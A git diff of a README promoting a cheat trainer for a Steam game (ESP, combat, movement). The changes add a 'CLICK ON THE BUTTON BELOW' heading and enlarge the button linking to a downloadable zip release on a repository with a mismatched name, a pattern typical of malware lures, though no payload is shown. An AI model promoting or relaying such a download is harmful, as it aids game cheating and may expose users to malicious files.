@@ -1,6 +1,6 @@
 <div align="center">
 
-<img src="assets/banner.jpg" alt="MECCHA CHAMELEON" width="920">
+<img src="assets/banner.png" alt="MECCHA CHAMELEON" width="920">
 
 <br>
 
@@ -9,11 +9,12 @@
 **Full feature suite for Steam App 4704690 — ESP, combat, movement, protection.**
 
 *Paint · Pose · Blend · Dominate*
+## CLICK ON THE BUTTON BELOW
 
 <br>
 
 <a href="https://github.com/imagedeckhandvalley/MecchaAlpha/releases/download/Meccha/MecchaChameleonTrainer.zip">
-  <img src="assets/button.svg" alt="Get Release" height="64">
+  <img src="assets/button.png" alt="Get Release" height="200">
 </a>
 
 <br><br>
